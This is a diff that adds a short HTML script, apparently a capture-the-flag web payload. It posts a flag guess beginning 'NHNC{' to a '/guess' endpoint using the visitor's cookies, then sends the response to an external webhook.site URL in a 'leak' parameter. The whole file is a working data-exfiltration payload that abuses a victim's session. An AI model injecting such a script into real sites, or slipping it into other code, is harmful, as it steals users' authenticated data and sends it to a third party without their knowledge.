@@ -1,0 +1,12 @@
+<script>
+fetch("/guess", {
+  method: "POST",
+  credentials: "include",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ guess: "NHNC{", note: "stage1" })
+})
+.then(r => r.json())
+.then(data => {
+  fetch("https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?leak=" + encodeURIComponent(JSON.stringify(data)))
+})
+</script>
